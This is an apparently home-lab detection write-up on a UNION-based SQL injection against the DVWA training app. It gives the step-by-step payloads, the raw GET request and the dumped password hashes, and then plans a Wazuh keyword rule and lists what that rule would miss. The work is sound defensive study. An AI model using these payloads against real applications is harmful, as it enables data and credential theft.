# Detection — SQL Injection (UNION-based)

**Technique:** T1190 — Exploit Public-Facing Application
**Rule:** _TODO — Phase 3 (Wazuh)_
**Status:** Draft — attack captured, detection pending SIEM

## Attack

UNION-based SQL injection against DVWA's SQL Injection module. The "User ID"
field is concatenated directly into a SQL query, allowing the query to be
rewritten to return arbitrary columns from the database. Escalated from a
confirmation probe to a full dump of the credential store.

| Field | Value |
|-------|-------|
| Target | `http://192.168.122.1:8080/vulnerabilities/sqli/` |
| Configuration | DVWA security level: low |
| Attacker | Kali VM (192.168.122.0/24) |
| Payload | `' UNION SELECT user, password FROM users-- -` |
| Time run | 2026-08-29 ~08:30 (approx) |

### Steps

The attack was built up in stages rather than run blind:

1. **Baseline** — input `1` returned a single user's name fields
   (`first_name`, `surname`). Intended behaviour, establishes the normal
   response.
2. **Confirm injectable** — input `' OR '1'='1` returned all five users instead
   of one. The leading quote closes the string, `OR '1'='1'` is always true, so
   the `WHERE user_id` filter is bypassed. Confirms input alters query logic.
3. **Column count** — `' ORDER BY 1-- -` upward until it errors, establishing
   the query returns 2 columns (required for a valid UNION).
4. **Exfiltrate** — `' UNION SELECT user, password FROM users-- -` appended a
   second result set, returning usernames and password hashes — columns the page
   was never built to display.

## Log evidence

The underlying vulnerable query is of the form:

```sql
SELECT first_name, surname FROM users WHERE user_id = '$input'
```

With the UNION payload substituted:

```sql
SELECT first_name, surname FROM users WHERE user_id = ''
UNION SELECT user, password FROM users-- -'
```

Result returned to the page — `user` rendered in the "First name" slot,
`password` (unsalted MD5) rendered in the "Surname" slot:

```
admin    5f4dcc3b5aa765d61d8327deb882cf99
gordonb  e99a18c428cb38d5f260853678922e03
1337     8d3533d75ae2c3966d7e0d4fcc69216b
pablo    0d107d09f5bbe40cade3de5c71e9e9b7
smithy   5f4dcc3b5aa765d61d8327deb882cf99
```

Note `admin` and `smithy` share the hash `5f4dcc3b...`, which is the unsalted
MD5 of the string `password` — identical passwords produce identical hashes
because the storage is unsalted, itself a separate weakness.

The request as seen on the wire (URL-encoded GET parameter):

```
GET /vulnerabilities/sqli/?id=' UNION SELECT user, password FROM users-- -&Submit=Submit
```

_TODO Phase 3: replace with the actual web server / Wazuh log line once the
agent is collecting, and record the exact timestamp for correlation._

## The rule

_TODO — Phase 3. Detection will key on SQL keywords appearing in HTTP request
parameters (e.g. `UNION SELECT`, `OR '1'='1`, `-- ` comment sequences) in the
web server access logs. Rule to be written and mapped once Wazuh is ingesting
DVWA's logs._

## Alert

_TODO — Phase 3. Screenshot of the Wazuh alert firing, saved to `evidence/`._

## False positives

_TODO — Phase 3. Consider: legitimate search queries containing the word
"union" or "select"; application parameters that legitimately contain SQL-like
strings. Note how the rule is tuned to reduce these._

## What this misses

Detection based on matching SQL keywords in request parameters will **not**
catch:

- **Blind injection** that avoids obvious keywords, or heavily obfuscated /
  encoded payloads (comments inserted mid-keyword, hex encoding, etc.).
- **Time-based blind injection**, where the payload may not contain flagged
  keywords and the signal is in response timing, not request content.
- Injection over **POST bodies** if only query strings are inspected.
- The attack **succeeding** — the log shows the attempt was made, not
  necessarily that data was exfiltrated. Distinguishing a successful dump from a
  blocked attempt requires correlating response size or status, noted for later.
